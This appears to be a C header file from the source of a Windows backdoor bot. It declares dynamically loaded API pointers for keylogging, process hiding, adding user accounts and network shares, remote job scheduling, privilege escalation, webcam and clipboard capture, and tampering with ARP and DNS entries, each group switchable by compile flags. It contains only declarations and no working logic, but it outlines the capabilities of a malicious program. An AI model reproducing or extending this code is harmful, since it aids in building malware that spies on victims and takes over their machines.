// kernel32.dll function variables
extern SEM fSetErrorMode;
extern CT32S fCreateToolhelp32Snapshot;
extern P32F fProcess32First;
extern P32N fProcess32Next;
extern M32F fModule32First;
extern GDFSE fGetDiskFreeSpaceEx;
extern GLDS fGetLogicalDriveStrings;
extern GDT fGetDriveType;
extern SP fSearchPath;
extern QPC fQueryPerformanceCounter;
extern QPF fQueryPerformanceFrequency;
extern RSP fRegisterServiceProcess;

// user32.dll function variables
extern SM fSendMessage;
extern FW fFindWindow;
extern IW fIsWindow;
extern DW fDestroyWindow;
extern OC fOpenClipboard;
extern GCD fGetClipboardData;
extern CC fCloseClipboard;
extern EWE fExitWindowsEx;
#ifndef NO_KEYLOG
extern GAKS fGetAsyncKeyState;
extern GKS fGetKeyState;
extern GWT fGetWindowText;
extern GFW fGetForegroundWindow;
#endif

// advapi32.dll function variables
extern ROKE fRegOpenKeyEx;
extern RCKE fRegCreateKeyEx;
extern RSVE fRegSetValueEx;
extern RQVE fRegQueryValueEx;
extern RDV fRegDeleteValue;
extern RCK fRegCloseKey;
#ifndef NO_PROCESS
extern OPT fOpenProcessToken;
extern LPV fLookupPrivilegeValue;
extern ATP fAdjustTokenPrivileges;
#endif
#ifndef NO_NET
extern OSCM fOpenSCManager;
extern OS fOpenService;
extern SS fStartService;
extern CS fControlService;
extern DS fDeleteService;
extern CSH fCloseServiceHandle;
extern ESS fEnumServicesStatus;
extern IVSD fIsValidSecurityDescriptor;
#endif
#ifndef NO_SYSINFO
extern GUN fGetUserName;
#endif

// gdi32.dll function variables
extern CDC fCreateDC;
extern CDIBS fCreateDIBSection;
extern CCDC fCreateCompatibleDC;
extern GDC fGetDeviceCaps;
extern GDIBCT fGetDIBColorTable;
extern SO fSelectObject;
extern BB fBitBlt;
extern DDC fDeleteDC;
extern DO fDeleteObject;

// ws2_32.dll function variables
extern WSAS fWSAStartup;
extern WSASo fWSASocket;
extern WSAAS fWSAAsyncSelect;
extern WSAFDIS __fWSAFDIsSet;
extern WSAI fWSAIoctl;
extern WSAGLE fWSAGetLastError;
extern WSAC fWSACleanup;
extern SOCK fsocket;
extern IOCTLS fioctlsocket;
extern CON fconnect;
extern INTOA finet_ntoa;
extern IADDR finet_addr;
extern HTONS fhtons;
extern HTONL fhtonl;
extern NTOHS fntohs;
extern NTOHL fntohl;
extern SEND fsend;
extern SENDTO fsendto;
extern RECV frecv;
extern RECVFROM frecvfrom;
extern BIND fbind;
extern SEL fselect;
extern LIS flisten;
extern ACC faccept;
extern SSO fsetsockopt;
extern GSN fgetsockname;
extern GHN fgethostname;
extern GHBN fgethostbyname;
extern GHBA fgethostbyaddr;
extern GPN fgetpeername;
extern CLSO fclosesocket;

// wininet.dll function variables
extern IGCS fInternetGetConnectedState;
extern IGCSE fInternetGetConnectedStateEx;
extern HOR fHttpOpenRequest;
extern HSR fHttpSendRequest;
extern IC fInternetConnect;
extern IO fInternetOpen;
extern IOU fInternetOpenUrl;
extern ICU fInternetCrackUrl;
extern IRF fInternetReadFile;
extern ICH fInternetCloseHandle;

// icmp.dll function variables
#ifndef NO_PING
extern ICF fIcmpCreateFile;
extern ISE fIcmpSendEcho;
extern ICH fIcmpCloseHandle;
#endif

// netapi32.dll function variables
extern NSA fNetShareAdd;
extern NSD fNetShareDel;
extern NSE fNetShareEnum;
extern NSJA fNetScheduleJobAdd;
extern NABF fNetApiBufferFree;
extern NRTOD fNetRemoteTOD;
extern NUA fNetUserAdd;
extern NUD fNetUserDel;
extern NUE fNetUserEnum;
extern NUGI fNetUserGetInfo;
extern NMBS fNetMessageBufferSend;

// dnsapi.dll function variables
extern DFRC fDnsFlushResolverCache;
extern DFRCEA fDnsFlushResolverCacheEntry_A;

// iphlpapi.dll function variables
extern GINT fGetIpNetTable;
extern DINE fDeleteIpNetEntry;

// mpr.dll function variables
extern WNAC2 fWNetAddConnection2;
extern WNAC2W fWNetAddConnection2W;
extern WNCC2 fWNetCancelConnection2;
extern WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
extern SE fShellExecute;
extern SHCN fSHChangeNotify;

// odbc32.dll function variables
extern SQLDC fSQLDriverConnect;
extern SQLSEA fSQLSetEnvAttr;
extern SQLED fSQLExecDirect;
extern SQLAH fSQLAllocHandle;
extern SQLFH fSQLFreeHandle;
extern SQLD fSQLDisconnect;

#ifndef NO_CAPTURE
// avicap32.dll function variables
extern cCCW fcapCreateCaptureWindow;
extern cGDD fcapGetDriverDescription;
#endif


// globals for dynamic libraries
extern BOOL nokernel32;
extern BOOL nouser32;
extern BOOL noadvapi32;
extern BOOL nogdi32;
extern BOOL nows2_32;
extern BOOL nowininet;
extern BOOL noicmp;
extern BOOL nonetapi32;
extern BOOL nodnsapi;
extern BOOL noiphlpapi;
extern BOOL nompr;
extern BOOL noshell32;
extern BOOL noodbc32;
extern BOOL noavicap32;